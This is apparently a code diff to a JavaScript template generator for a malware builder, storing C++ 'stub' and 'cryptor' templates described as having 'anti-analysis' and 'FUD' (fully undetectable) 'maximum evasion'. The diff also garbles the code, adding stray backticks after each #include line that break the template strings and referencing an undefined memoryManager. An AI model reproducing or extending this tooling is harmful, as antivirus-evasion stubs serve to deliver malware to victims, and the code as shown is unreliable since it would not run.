@@ -2,12 +2,25 @@
 const { logger } = require('../utils/logger');
 
 class TemplateGenerator {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
         this.name = 'TemplateGenerator';
         this.version = '2.0.0';
-        this.templates = new Map();
-        this.cryptorTemplates = new Map();
-        this.stubTemplates = new Map();
+        this.templates = this.memoryManager.createManagedCollection('templates', 'Map', 100);
+        this.cryptorTemplates = this.memoryManager.createManagedCollection('cryptorTemplates', 'Map', 100);
+        this.stubTemplates = this.memoryManager.createManagedCollection('stubTemplates', 'Map', 100);
         this.isInitialized = false;
     }
 
@@ -31,9 +44,9 @@ class TemplateGenerator {
             name: 'Basic C++ Stub',
             language: 'cpp',
             description: 'Basic C++ stub template',
-            code: `#include <iostream>
-#include <windows.h>
-#include <string>
+            code: `#include <iostream>`
+#include <windows.h>`
+#include <string>`
 
 class BasicStub {
 private:
@@ -62,12 +75,12 @@ int main() {
             name: 'Advanced C++ Stub',
             language: 'cpp',
             description: 'Advanced C++ stub with anti-analysis',
-            code: `#include <iostream>
-#include <windows.h>
-#include <string>
-#include <vector>
-#include <thread>
-#include <chrono>
+            code: `#include <iostream>`
+#include <windows.h>`
+#include <string>`
+#include <vector>`
+#include <thread>`
+#include <chrono>`
 
 class AdvancedStub {
 private:
@@ -170,13 +183,13 @@ if __name__ == "__main__":
             name: 'Basic Cryptor',
             language: 'cpp',
             description: 'Basic file cryptor template',
-            code: `#include <iostream>
-#include <fstream>
-#include <string>
-#include <vector>
-#include <cryptopp/aes.h>
-#include <cryptopp/modes.h>
-#include <cryptopp/filters.h>
+            code: `#include <iostream>`
+#include <fstream>`
+#include <string>`
+#include <vector>`
+#include <cryptopp/aes.h>`
+#include <cryptopp/modes.h>`
+#include <cryptopp/filters.h>`
 
 class BasicCryptor {
 private:
@@ -194,7 +207,7 @@ public:
         return data;
     }
     
-    std::vector<unsigned char> decrypt(const std::vector<unsigned char>& data) {
+    std::vector<unsigned char>` decrypt(const std::vector<unsigned char>`& data) {
         // Decryption logic here
         return data;
     }
@@ -293,13 +306,13 @@ int main() {
             name: 'FUD Stub Template',
             language: 'cpp',
             description: 'FUD stub with maximum evasion',
-            code: `#include <iostream>
-#include <windows.h>
-#include <string>
-#include <vector>
-#include <thread>
-#include <chrono>
-#include <random>
+            code: `#include <iostream>`
+#include <windows.h>`
+#include <string>`
+#include <vector>`
+#include <thread>`
+#include <chrono>`
+#include <random>`
 
 class FUDStub {
 private:
@@ -446,13 +459,13 @@ int main() {
             }
             
             if (!template) {
-                throw new Error(`Template '${templateName}' not found`);
+                throw new Error("Template '" + templateName + "' not found");
             }
             
             // Replace variables in template
             let generatedCode = template.code;
             for (const [key, value] of Object.entries(variables)) {
-                const templateVariable = `{{${key.toUpperCase()}}}`;
+                const templateVariable = "{{" + key.toUpperCase() + "}}";
                 generatedCode = generatedCode.replace(new RegExp(templateVariable, 'g'), value);
             }
             
@@ -465,7 +478,7 @@ int main() {
                 variables: variables
             };
         } catch (error) {
-            logger.error(`Failed to generate template '${templateName}':`, error);
+            logger.error("Failed to generate template '" + templateName + "':", error);
             throw error;
         }
     }
@@ -515,12 +528,12 @@ int main() {
             }
             
             if (!template) {
-                throw new Error(`Template '${templateName}' not found`);
+                throw new Error("Template '" + templateName + "' not found");
             }
             
             return { success: true, template };
         } catch (error) {
-            logger.error(`Failed to get template info for '${templateName}':`, error);
+            logger.error("Failed to get template info for '" + templateName + "':", error);
             throw error;
         }
     }
